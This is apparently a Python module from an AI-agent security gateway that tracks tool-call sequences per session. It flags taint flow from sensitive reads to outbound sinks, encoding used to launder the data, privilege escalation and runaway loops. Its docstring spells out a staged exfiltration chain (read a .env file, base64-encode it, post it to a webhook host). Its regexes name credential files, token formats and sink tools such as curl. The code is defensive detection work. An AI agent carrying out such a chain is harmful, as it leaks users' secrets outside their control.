"""Tool-chain analysis — attacks that exist only in the SEQUENCE.

WHY THIS EXISTS
---------------
``app.surfaces.tools`` inspects one call at a time, and that is structurally
blind to the most common real-world agent compromise, because every step is
individually legitimate:

    1. read_file("/srv/workspace/.env")          ← allowed: inside the workspace
    2. base64_encode(<contents>)                 ← allowed: a pure transform
    3. http_post("https://hooks.example.com", …) ← allowed: an approved host

No single call violates a rule. The exfiltration is the *edge* between them, and
per-call analysis cannot see edges. Reviewing calls one at a time is like
approving each wire transfer under the reporting threshold.

WHAT THIS TRACKS
----------------
  * TAINT FLOW — data read from a sensitive SOURCE reaching an outbound SINK.
    Taint is carried by content fingerprints, so it survives the transforms
    (base64, hex, compression, chunking) an attacker uses to break naive
    substring matching between the read and the send.
  * LAUNDERING — a transform applied between a sensitive read and a send is
    itself evidence, because benign workflows rarely encode data purely to move
    it somewhere else.
  * PRIVILEGE RAMP — a session whose calls escalate from reads to writes to
    outbound/destructive over time.
  * LOOPS AND VELOCITY — an agent repeating a call or fanning out at machine
    speed (LLM10, unbounded consumption), which is also the shape of a runaway
    or a prompt-injected worker.

DESIGN NOTE
-----------
Sessions are bounded ring buffers with a TTL. The tracker is the only stateful
piece of the surface layer, so it is deliberately small, capped, and safe to
lose: a restart weakens chain detection until sessions rebuild, and never opens
a hole in the per-call checks.
"""
from __future__ import annotations

import hashlib
import re
import threading
import time
from dataclasses import dataclass, field

from app.config import settings
from app.surfaces.base import SurfaceFinding, SurfaceResult
from app.surfaces.tools import ToolCall, classify_effect
from app.taxonomy import Channel, OwaspLLM, Verdict

_SURFACE = "toolchain"

# Sessions are capped so an attacker cannot grow memory by minting session ids.
_MAX_SESSIONS = 2_000
_MAX_STEPS_PER_SESSION = 200
_SESSION_TTL_SECONDS = 3600


# ---------------------------------------------------------------------------
# Source / sink classification
# ---------------------------------------------------------------------------

# What counts as a SENSITIVE SOURCE is split by WHERE we are looking, because
# the same word means different things in a path and in a document body.
#
# A file called "credentials" is a secret store. A sentence containing the word
# "invoice" is a sentence. Matching topic words against result CONTENT was
# flagging ordinary business documents — every refund policy mentions invoices —
# so content matching is restricted to things that are secrets by SHAPE.
_SECRET_LOCATOR = re.compile(
    r"\.env\b|\.aws/|\.ssh/|\.kube/|\.netrc|\.git-credentials|"
    r"credentials?|secrets?|password|passwd|token|api[_-]?key|private[_-]?key|"
    r"id_rsa|id_ed25519|keychain|vault|/etc/(shadow|passwd)|"
    r"payroll|salary|ssn|social[_-]?security|medical|patient|"
    r"confidential|classified|restricted|proprietary",
    re.IGNORECASE)

# Secrets by shape — safe to match against document/result bodies.
# Case-sensitive: these formats are defined with fixed casing, and matching them
# case-insensitively would fire on ordinary prose.
_SECRET_CONTENT_EXACT = re.compile(
    r"\b(AKIA|ASIA)[0-9A-Z]{16}\b|"
    r"-----BEGIN [A-Z ]{0,20}PRIVATE KEY-----|"
    r"\bgh[pousr]_[A-Za-z0-9]{36,}\b|"
    r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b|"
    r"\bsk-[A-Za-z0-9_-]{20,}\b|"
    r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b")

# KEY=value assignments of credential-shaped names with a non-trivial value.
_SECRET_CONTENT_ASSIGNMENT = re.compile(
    r"\b[A-Z0-9_]{0,20}(SECRET|PASSWORD|PASSWD|TOKEN|API[_-]?KEY|"
    r"PRIVATE[_-]?KEY|ACCESS[_-]?KEY)[A-Z0-9_]{0,20}\s*[=:]\s*\S{8,}",
    re.IGNORECASE)


def _has_secret_content(text: str) -> bool:
    return bool(_SECRET_CONTENT_EXACT.search(text)
                or _SECRET_CONTENT_ASSIGNMENT.search(text))

# A SINK moves data outside the trust boundary.
_SINK_EFFECTS = {"outbound", "financial"}
_SINK_NAME = re.compile(
    r"send|email|mail|post|publish|upload|webhook|notify|share|export|"
    r"transmit|forward|tweet|slack|discord|telegram|sms|http_post|fetch|curl",
    re.IGNORECASE)

# A TRANSFORM changes representation without changing meaning — the laundering
# step between a read and a send.
_TRANSFORM_NAME = re.compile(
    r"encode|decode|base64|hex|compress|zip|gzip|encrypt|obfuscate|serialize|"
    r"convert|transform|chunk|split|hash|summar",
    re.IGNORECASE)

_READ_NAME = re.compile(
    r"read|get|fetch|list|search|query|find|load|open|cat|download|retrieve",
    re.IGNORECASE)


def _shingles(text: str, size: int = 24, sample_bits: int = 3) -> set[str]:
    """Alignment-invariant content fingerprints.

    Hashes overlapping windows of the normalized character stream so the same
    payload is recognised after a case change, a re-encoding, a whitespace
    reflow, or being embedded in a larger argument.

    Two details matter, and getting either wrong silently breaks detection:

    * STRIDE 1, not a fixed step. A strided window set only collides when both
      texts happen to share the same offset. Embedding the payload after a URL
      of arbitrary length shifts every window and the sets miss completely —
      which is exactly what an exfiltration call looks like.
    * DETERMINISTIC SAMPLING instead of keeping everything. Stride 1 over a
      50 KB result is 50k hashes per call; keeping only fingerprints whose hash
      falls below a threshold (~1 in 2**sample_bits) bounds memory while
      preserving collisions, because both sides sample identically.
    """
    clean = re.sub(r"[^a-z0-9]", "", (text or "").lower())
    if len(clean) < size:
        return set()
    threshold = 256 >> sample_bits
    out: set[str] = set()
    for i in range(0, len(clean) - size + 1):
        digest = hashlib.blake2b(clean[i:i + size].encode(), digest_size=8).digest()
        if digest[0] < threshold:
            out.add(digest.hex())
        if len(out) >= 2_000:
            break
    return out


@dataclass
class ChainStep:
    tool: str
    effects: list[str]
    is_source: bool
    is_sink: bool
    is_transform: bool
    sensitive: bool
    taint: set[str] = field(default_factory=set)
    at: float = field(default_factory=time.time)
    argument_digest: str = ""


@dataclass
class SessionChain:
    steps: list[ChainStep] = field(default_factory=list)
    taint_pool: set[str] = field(default_factory=set)
    tainted_sources: list[str] = field(default_factory=list)
    last_seen: float = field(default_factory=time.time)

    def prune(self) -> None:
        if len(self.steps) > _MAX_STEPS_PER_SESSION:
            self.steps = self.steps[-_MAX_STEPS_PER_SESSION:]
        # Bound the taint pool too; keep the most recent fingerprints.
        if len(self.taint_pool) > 4_000:
            self.taint_pool = set(list(self.taint_pool)[-4_000:])


@dataclass
class ChainResult(SurfaceResult):
    """SurfaceResult plus the chain-level decision."""

    session_id: str = ""
    execute_allowed: bool = True
    requires_approval: bool = False
    chain_length: int = 0
    taint_hits: int = 0

    def as_dict(self) -> dict:
        d = super().as_dict()
        d.update({
            "session_id": self.session_id,
            "execute_allowed": self.execute_allowed,
            "requires_approval": self.requires_approval,
            "chain_length": self.chain_length,
            "taint_hits": self.taint_hits,
        })
        return d


class ToolChainTracker:
    """Per-session tool-call history with taint propagation."""

    def __init__(self) -> None:
        self._sessions: dict[str, SessionChain] = {}
        self._lock = threading.Lock()

    def _session(self, session_id: str, now: float) -> SessionChain:
        chain = self._sessions.get(session_id)
        if chain is None or (now - chain.last_seen) > _SESSION_TTL_SECONDS:
            chain = SessionChain()
            self._sessions[session_id] = chain
        chain.last_seen = now
        if len(self._sessions) > _MAX_SESSIONS:
            oldest = sorted(self._sessions.items(),
                            key=lambda kv: kv[1].last_seen)[: len(self._sessions) // 4]
            for key, _ in oldest:
                self._sessions.pop(key, None)
        return chain

    def observe(self, session_id: str, call: ToolCall, *,
                result_text: str = "") -> ChainResult:
        """Record a call (and optionally its result) and assess the chain.

        ``result_text`` matters: it is what actually carries the sensitive bytes
        forward. Callers that feed results in get true taint tracking; callers
        that do not still get source/sink adjacency, laundering, and velocity.
        """
        if not settings.surfaces.enabled("tools"):
            out = ChainResult(surface=_SURFACE, enabled=False, session_id=session_id,
                              reasons=[f"surface-disabled:{_SURFACE}"])
            return out

        now = time.time()
        th = settings.surface_thresholds
        result = ChainResult(surface=_SURFACE, session_id=session_id)

        with self._lock:
            chain = self._session(session_id, now)

            effects = classify_effect(call)
            arg_text = " ".join(str(v) for v in (call.arguments or {}).values())
            haystack = f"{call.name} {arg_text}"

            is_sink = bool(_SINK_NAME.search(call.name)
                           or set(effects) & _SINK_EFFECTS)
            is_read = bool(_READ_NAME.search(call.name)) or "read" in effects
            is_transform = bool(_TRANSFORM_NAME.search(call.name))
            # Locator words count in the tool name and arguments (a path called
            # "credentials"); only secret-SHAPED content counts in a result body.
            sensitive = bool(_SECRET_LOCATOR.search(haystack)
                             or _has_secret_content(result_text[:20_000]))
            is_source = is_read and sensitive

            # Taint carried INTO this call by its arguments.
            arg_taint = _shingles(arg_text)
            taint_hits = len(arg_taint & chain.taint_pool) if chain.taint_pool else 0

            step = ChainStep(
                tool=call.ident, effects=effects, is_source=is_source,
                is_sink=is_sink, is_transform=is_transform, sensitive=sensitive,
                taint=arg_taint, at=now,
                argument_digest=hashlib.sha256(
                    arg_text.encode("utf-8", "replace")).hexdigest()[:12],
            )
            chain.steps.append(step)
            chain.prune()

            risk = 0.0

            def add(kind: str, severity: float, reason: str, excerpt: str = "",
                    category: OwaspLLM = OwaspLLM.LLM06_SENSITIVE_INFO) -> None:
                nonlocal risk
                result.findings.append(SurfaceFinding(
                    surface=_SURFACE, location=f"chain:{session_id}:{len(chain.steps)}",
                    channel=Channel.STRUCTURED.value, severity=severity, kind=kind,
                    reason=reason, excerpt=excerpt, category=category,
                    source=call.ident,
                ))
                risk = max(risk, severity)

            # --- 1) taint reaching a sink ---------------------------------
            if is_sink and taint_hits > 0:
                add("chain:tainted-data-to-sink", 0.90,
                    (f"outbound call carries {taint_hits} content fingerprints "
                     f"read earlier from a sensitive source "
                     f"({', '.join(chain.tainted_sources[-3:])})"),
                    category=OwaspLLM.LLM06_SENSITIVE_INFO)

            # --- 2) source -> sink adjacency (no result text needed) -------
            if is_sink and not taint_hits:
                recent = chain.steps[-8:-1]
                sources = [s for s in recent if s.is_source]
                if sources:
                    laundered = any(s.is_transform for s in recent)
                    severity = 0.80 if laundered else 0.65
                    add("chain:source-to-sink" + (":laundered" if laundered else ""),
                        severity,
                        (f"a sensitive read ({sources[-1].tool}) is followed by an "
                         f"outbound call ({call.ident})"
                         + (" with an encoding step in between — the shape of "
                            "staged exfiltration" if laundered else "")),
                        category=OwaspLLM.LLM06_SENSITIVE_INFO)

            # --- 3) privilege ramp ----------------------------------------
            if len(chain.steps) >= 4:
                consequence = [
                    max([_EFFECT_RANK.get(e, 0) for e in s.effects], default=0)
                    for s in chain.steps[-6:]
                ]
                if (len(consequence) >= 4 and consequence[-1] >= 3
                        and consequence[0] <= 1
                        and consequence == sorted(consequence)):
                    add("chain:privilege-ramp", 0.60,
                        ("this session's tool calls escalate monotonically from "
                         "reads to high-consequence actions"),
                        category=OwaspLLM.LLM06_EXCESSIVE_AGENCY)

            # --- 4) loops and velocity (LLM10) ----------------------------
            window = [s for s in chain.steps if now - s.at <= 60]
            if len(window) >= 30:
                add("chain:high-velocity", 0.55,
                    f"{len(window)} tool calls in 60s — runaway or fan-out loop",
                    category=OwaspLLM.LLM10_UNBOUNDED_CONSUMPTION)
            identical = [s for s in chain.steps[-10:]
                         if s.tool == step.tool
                         and s.argument_digest == step.argument_digest]
            if len(identical) >= 5:
                add("chain:repeat-loop", 0.50,
                    f"the same call repeated {len(identical)}x — stuck agent loop",
                    category=OwaspLLM.LLM10_UNBOUNDED_CONSUMPTION)

            # --- update taint AFTER assessing this step -------------------
            if sensitive and result_text:
                chain.taint_pool |= _shingles(result_text[:50_000])
                chain.tainted_sources.append(call.ident)
                chain.tainted_sources = chain.tainted_sources[-10:]
            elif is_source:
                # No result supplied: taint the arguments so at least the path
                # identifier propagates.
                chain.taint_pool |= arg_taint
                chain.tainted_sources.append(call.ident)
                chain.tainted_sources = chain.tainted_sources[-10:]
            # A transform propagates taint from its input to its output.
            if is_transform and taint_hits and result_text:
                chain.taint_pool |= _shingles(result_text[:50_000])

            result.chain_length = len(chain.steps)
            result.taint_hits = taint_hits

        result.risk = round(min(1.0, risk), 4)
        result.segments_scanned = 1
        if result.findings:
            top = max(result.findings, key=lambda f: f.severity)
            result.category = top.category
            result.reasons.extend(f.kind for f in result.findings[:6])

        if result.risk >= th.block:
            result.verdict = Verdict.BLOCK
            result.execute_allowed = False
            result.quarantined = True
        elif result.risk >= th.quarantine:
            result.verdict = Verdict.REVIEW
            result.execute_allowed = False
            result.requires_approval = True
        else:
            result.verdict = Verdict.ALLOW

        result.meta.update({"chain_length": result.chain_length,
                            "taint_pool": len(chain.taint_pool),
                            "tainted_sources": chain.tainted_sources[-3:]})
        return result

    def reset(self, session_id: str | None = None) -> None:
        with self._lock:
            if session_id is None:
                self._sessions.clear()
            else:
                self._sessions.pop(session_id, None)

    def chain(self, session_id: str) -> list[ChainStep]:
        with self._lock:
            chain = self._sessions.get(session_id)
            return list(chain.steps) if chain else []


# Ranking used by the privilege-ramp check.
_EFFECT_RANK = {
    "read": 1, "outbound": 3, "execution": 3, "privilege": 3,
    "credential": 3, "destructive": 4, "financial": 4,
}


_tracker: ToolChainTracker | None = None


def get_tracker() -> ToolChainTracker:
    global _tracker
    if _tracker is None:
        _tracker = ToolChainTracker()
    return _tracker


def observe(session_id: str, call: ToolCall, *, result_text: str = "") -> ChainResult:
    """Convenience entry point used by tests and the API."""
    return get_tracker().observe(session_id, call, result_text=result_text)
